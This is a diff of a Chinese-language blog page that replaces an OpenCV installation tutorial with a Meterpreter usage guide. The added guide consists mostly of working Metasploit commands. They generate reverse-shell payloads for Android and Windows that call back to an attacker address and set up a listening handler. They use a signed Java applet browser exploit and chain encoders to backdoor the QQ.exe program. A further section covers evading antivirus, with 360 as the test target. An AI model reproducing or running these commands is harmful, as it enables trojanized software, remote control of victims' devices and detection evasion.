@@ -22,7 +22,7 @@
 
 
 
-  <meta name="keywords" content="python,ubuntu," />
+  <meta name="keywords" content="kali," />
 
 
 
@@ -55,7 +55,7 @@
 
 
 
-  <title> Ubuntu安装OpenCV 3.0以及Python接口 // Neurohazard </title>
+  <title> meterpreter 使用指南 // Neurohazard </title>
 </head>
 
 <body>
@@ -166,7 +166,7 @@
           
           
             
-              Ubuntu安装OpenCV 3.0以及Python接口
+              meterpreter 使用指南
             
           
         </h1>
@@ -174,14 +174,14 @@
 
       <div class="post-meta">
         <span class="post-time">
-          發表於 2015-07-16
+          發表於 2015-11-22
         </span>
 
         
           <span class="post-category">
             &nbsp; | &nbsp; 分類於
             
-              <a href="/categories/机器学习/">机器学习</a>
+              <a href="/categories/信息安全/">信息安全</a>
 
               
               
@@ -194,8 +194,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/07/16/ubuntu-opencv-python/#comments" >
-              <span class="post-comments-count ds-thread-count" data-thread-key="2015/07/16/ubuntu-opencv-python/"></span>
+            <a href="/2015/11/22/meterpreter-tutorial/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/22/meterpreter-tutorial/"></span>
             </a>
           </span>
           
@@ -209,35 +209,21 @@
       
 
       
-        <h1 id="系统环境">系统环境</h1><p>Ubuntu系统版本：Ubuntu Kylin 14.04 (32位)<br>OpenCV软件版本：opencv-3.0.0</p>
-<h1 id="OpenCV下载">OpenCV下载</h1><p>进入<a href="http://opencv.org/" target="_blank" rel="external">OpenCV官网</a><br>在右侧选择 OpenCV for Linux/Mac</p>
-<h1 id="安装步骤">安装步骤</h1><h2 id="安装OpenCV所需的库（编译器、必须库、可选库）">安装OpenCV所需的库（编译器、必须库、可选库）</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[compiler] sudo apt-<span class="built_in">get</span> install build-essential</span><br><span class="line">[required] sudo apt-<span class="built_in">get</span> install cmake git libgtk2.0-<span class="built_in">dev</span> pkg-config libavcodec-<span class="built_in">dev</span> libavformat-<span class="built_in">dev</span> libswscale-<span class="built_in">dev</span></span><br><span class="line">[optional] sudo apt-<span class="built_in">get</span> install python-<span class="built_in">dev</span> python-numpy libtbb2 libtbb-<span class="built_in">dev</span> libjpeg-<span class="built_in">dev</span> libpng-<span class="built_in">dev</span> libtiff-<span class="built_in">dev</span> libjasper-<span class="built_in">dev</span> libdc1394-<span class="number">22</span>-<span class="built_in">dev</span></span><br></pre></td></tr></table></figure>
-<h2 id="使用CMake编译OpenCV">使用CMake编译OpenCV</h2><p>详细的图文教程可参考<a href="http://pinkyjie.com/2010/10/19/ubuntu-opencv-python/" target="_blank" rel="external">此处</a>[3]</p>
-<p>假设下载文件到以下路径</p>
-<p><code>/home/&lt;your username&gt;</code> </p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip opencv-3.0.0.zip</span><br></pre></td></tr></table></figure>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/opencv-3.0.0</span><br></pre></td></tr></table></figure>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br></pre></td></tr></table></figure>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd build</span><br></pre></td></tr></table></figure>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local ..</span><br></pre></td></tr></table></figure>
-<p>这里别忘了最后的两个点<code>..</code>,最后一个参数是项目源码所在目录,此处的项目源码所在目录恰好是上级目录，即为<code>..</code>。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
-<p>这里可以在之后加参数加快编译速度，例如<code>make -j4</code></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-<h2 id="测试OpenCV">测试OpenCV</h2><p>1) 创建工作目录</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/opencv-lena</span><br><span class="line"><span class="built_in">cd</span> ~/opencv-lena</span><br><span class="line">gedit DisplayImage.cpp</span><br></pre></td></tr></table></figure>
-<p>2) 编辑如下代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;opencv2/opencv.hpp&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> cv;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv )</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( argc != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage: DisplayImage.out &lt;Image_Path&gt;\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Mat image;</span><br><span class="line">    image = imread( argv[<span class="number">1</span>], <span class="number">1</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !image.data )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"No image data \n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    namedWindow(<span class="string">"Display Image"</span>, WINDOW_AUTOSIZE );</span><br><span class="line">    imshow(<span class="string">"Display Image"</span>, image);</span><br><span class="line"></span><br><span class="line">    waitKey(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>3) 创建CMake编译文件<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit CMakeLists.txt</span><br></pre></td></tr></table></figure></p>
-<p>写入如下内容<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">cmake_minimum_required</span><span class="params">(VERSION <span class="number">2.8</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">project</span><span class="params">( DisplayImage )</span></span></span><br><span class="line"><span class="function"><span class="title">find_package</span><span class="params">( OpenCV REQUIRED )</span></span></span><br><span class="line"><span class="function"><span class="title">add_executable</span><span class="params">( DisplayImage DisplayImage.cpp )</span></span></span><br><span class="line"><span class="function"><span class="title">target_link_libraries</span><span class="params">( DisplayImage $&#123;OpenCV_LIBS&#125; )</span></span></span><br></pre></td></tr></table></figure></p>
-<p>4) 编译<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~/opencv-lena</span><br><span class="line">cmake .</span><br><span class="line"><span class="keyword">make</span></span><br></pre></td></tr></table></figure></p>
-<p>5) 执行</p>
-<p>此时opencv-lena文件夹中已经产生了可执行文件DisplayImage，下载lena.jpg(或者其他任意图片)放在opencv-lena下，运行<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./DisplayImage lena.jpg</span><br></pre></td></tr></table></figure></p>
-<h2 id="安装python接口">安装python接口</h2><p>可直接使用apt安装</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install <span class="keyword">python</span>-opencv</span><br><span class="line">sudo apt-<span class="built_in">get</span> install <span class="keyword">python</span>-numpy</span><br></pre></td></tr></table></figure>
-<p>测试:</p>
-<p>打开python，import cv模块成功即可。</p>
-<p>import cv</p>
-<h1 id="参考资料">参考资料</h1><p>[1] <a href="http://docs.opencv.org/3.0-last-rst/doc/tutorials/introduction/linux_install/linux_install.html" target="_blank" rel="external">官方参考文档</a><br>[2] <a href="http://www.linuxidc.com/Linux/2015-05/116960.htm" target="_blank" rel="external">http://www.linuxidc.com/Linux/2015-05/116960.htm</a><br>[3] <a href="http://pinkyjie.com/2010/10/19/ubuntu-opencv-python/" target="_blank" rel="external">详细的图文教程</a><br>[4] <a href="http://www.douban.com/note/478450231/" target="_blank" rel="external">http://www.douban.com/note/478450231/</a><br>[5] <a href="http://wushxin.top/2015/06/08/Opencv3%E9%85%8D%E7%BD%AE" target="_blank" rel="external">OpenCV 3.0 Visual Studio配置</a></p>
+        <h1 id="针对_Android">针对 Android</h1><p>生成apk</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sudo</span> msfvenom -p android/meterpreter/reverse_tcp LHOST=<span class="number">192.168.0.107</span> LPORT=<span class="number">4444</span> R &gt; androTor.apk</span><br></pre></td></tr></table></figure>
+<p>设置服务器接收</p>
+<p>以下在msfconsole中操作:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> PAYLOAD android/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> options</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">192.168</span>.0.107 </span><br><span class="line"></span><br><span class="line">exploit</span></span><br></pre></td></tr></table></figure>
+<h1 id="针对_Win_8">针对 Win 8</h1><h2 id="java_applet">java applet</h2><p>可以参考以下<a href="https://www.youtube.com/watch?v=HM4X_iv6mRY" target="_blank" rel="external">视频演示</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/browser/java_signed_applet</span><br><span class="line"></span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set SRVHOST &lt;attacke<span class="string">r's ip addr&gt;</span><br><span class="line"></span><br><span class="line">set LHOST &lt;attacher'</span>s ip addr&gt;</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h2 id="可执行文件">可执行文件</h2><p>此处可以参考这个<a href="https://www.youtube.com/watch?v=DzHfsXuYPw0" target="_blank" rel="external">视频</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="tag">p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">0.107</span> LPORT=<span class="number">4444</span> -f exe -e x86/shikata_ga_nai -<span class="tag">i</span> <span class="number">10</span> &gt; EXPLOIT.exe</span><br></pre></td></tr></table></figure>
+<h3 id="混合大法">混合大法</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">R raw</span><br><span class="line">-c 编码次数</span><br><span class="line">-x 这个是对某一个软件附加payload的选项。比如msfencode -i shell.exe –x qq.exe 这个命令就是说我把一个叫做shell.exe的后门添加到了一个叫做qq.exe的软件里面。</span><br><span class="line">-k 如果你使用了-x和-k参数。当你的payload运行后，它会从原始的主文件中分离出来，单独创建一个进程，并且运行。这个也是一个免杀的思路。</span><br><span class="line"></span><br><span class="line">msfpayload windows<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">0.107</span> LPORT=<span class="number">8080</span> R \</span><br><span class="line">| msfencode -e x86<span class="regexp">/shikata_ga_nai -c 5 -t raw \</span><br><span class="line">| msfencode -e x86/</span>alpha_upper -c <span class="number">2</span> -t raw \</span><br><span class="line">| msfencode -e x86<span class="regexp">/shikata_ga_nai -c 5 -t raw \</span><br><span class="line">| msfencode -e x86/</span>countdown -c <span class="number">5</span> -t exe -x <span class="regexp">/home/</span>ray<span class="regexp">/dev/</span>hack<span class="regexp">/backdoor/</span>QQ.exe \</span><br><span class="line">-k -o <span class="regexp">/home/</span>ray<span class="regexp">/dev/</span>hack<span class="regexp">/backdoor/</span>QQHD.exe</span><br></pre></td></tr></table></figure>
+<h3 id="查看编码器">查看编码器</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list</span><br><span class="line"></span><br><span class="line">x86/shikat<span class="built_in">a_ga</span>_nai </span><br><span class="line">x86/alph<span class="built_in">a_upper</span></span><br><span class="line">x86/countdown</span><br></pre></td></tr></table></figure>
+<h3 id="文件混合">文件混合</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="tag">a</span> x86 --platform windows -x /home/ray/dev/hack/backdoor/QQ<span class="class">.exe</span> -k -<span class="tag">p</span> windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">0.107</span> lport=<span class="number">8080</span> -<span class="tag">b</span> <span class="string">"\x00"</span> -f exe -e x86/shikata_ga_nai -<span class="tag">i</span> <span class="number">17</span> -o qqbd.exe</span><br></pre></td></tr></table></figure>
+<h1 id="bypass_AV">bypass AV</h1><p>主要以360为测试对象，对于特征查杀，Meterpreter基本可以依靠编码器/加密通过，不过行为查杀较难通过。</p>
+<p>[1] <a href="https://www.91ri.org/6169.html" target="_blank" rel="external">那些年一起绕过的杀软</a><br>[2] <a href="https://www.91ri.org/6342.html" target="_blank" rel="external">好免杀，hyperion造</a><br>[3] <a href="https://www.91ri.org/7798.html" target="_blank" rel="external">闲谈 bypass AV</a><br>[4] <a href="https://www.91ri.org/6877.html" target="_blank" rel="external">encode msf shellcode绕过杀毒</a><br>[5] <a href="https://www.91ri.org/6227.html" target="_blank" rel="external">Veil—绕过杀毒软件的payload生成器</a><br>[6] <a href="http://jingyan.baidu.com/article/afd8f4de6780ce34e386e97e.html" target="_blank" rel="external">UPX以及数字签名</a></p>
+<h1 id="参考资料">参考资料</h1><p>[1] <a href="http://drops.wooyun.org/tips/10146" target="_blank" rel="external">Meterpreter Guide - wooyun知识库</a><br>[2] 《Metasploit 渗透测试魔鬼训练营》<br>[3] <a href="http://www.freebuf.com/tools/69358.html" target="_blank" rel="external">玩转Metasploit系列（第六集）- Freebuf</a><br>[4] <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="external">Kali 官方指导</a><br>[5] <a href="http://c-chicken.cc/msf.txt" target="_blank" rel="external">MSF 目录树</a><br>[6] <a href="https://www.91ri.org/9018.html" target="_blank" rel="external">初探 Meterpreter</a><br>[7] <a href="https://www.91ri.org/5870.html" target="_blank" rel="external">metasploit网马的简单提取</a></p>
 
       
     </div>
@@ -246,9 +232,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/python/"> #python </a>
-          
-            <a href="/tags/ubuntu/"> #ubuntu </a>
+            <a href="/tags/kali/"> #kali </a>
           
         </div>
       
@@ -257,13 +241,11 @@
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/07/19/batch-operation/">find,sed与xargs:批量文件操作</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/07/15/ply-simple-demo/">PLY(Python Lex Yacc)简明笔记</a>
+              <a href="/2015/11/22/encryption-manual/">加密，证书与匿名的安全指南</a>
             
           </div>
         </div>
@@ -306,8 +288,8 @@
     
       <div class="comments" id="comments">
         
-          <div class="ds-thread" data-thread-key="2015/07/16/ubuntu-opencv-python/"
-               data-title="Ubuntu安装OpenCV 3.0以及Python接口" data-url="http://blkstone.github.io/2015/07/16/ubuntu-opencv-python/">
+          <div class="ds-thread" data-thread-key="2015/11/22/meterpreter-tutorial/"
+               data-title="meterpreter 使用指南" data-url="http://blkstone.github.io/2015/11/22/meterpreter-tutorial/">
           </div>
         
       </div>
@@ -420,7 +402,7 @@
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#系统环境"><span class="nav-number">1.</span> <span class="nav-text">系统环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#OpenCV下载"><span class="nav-number">2.</span> <span class="nav-text">OpenCV下载</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装步骤"><span class="nav-number">3.</span> <span class="nav-text">安装步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装OpenCV所需的库（编译器、必须库、可选库）"><span class="nav-number">3.1.</span> <span class="nav-text">安装OpenCV所需的库（编译器、必须库、可选库）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用CMake编译OpenCV"><span class="nav-number">3.2.</span> <span class="nav-text">使用CMake编译OpenCV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试OpenCV"><span class="nav-number">3.3.</span> <span class="nav-text">测试OpenCV</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装python接口"><span class="nav-number">3.4.</span> <span class="nav-text">安装python接口</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#针对_Android"><span class="nav-number">1.</span> <span class="nav-text">针对 Android</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#针对_Win_8"><span class="nav-number">2.</span> <span class="nav-text">针对 Win 8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#java_applet"><span class="nav-number">2.1.</span> <span class="nav-text">java applet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#可执行文件"><span class="nav-number">2.2.</span> <span class="nav-text">可执行文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#混合大法"><span class="nav-number">2.2.1.</span> <span class="nav-text">混合大法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看编码器"><span class="nav-number">2.2.2.</span> <span class="nav-text">查看编码器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件混合"><span class="nav-number">2.2.3.</span> <span class="nav-text">文件混合</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bypass_AV"><span class="nav-number">3.</span> <span class="nav-text">bypass AV</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
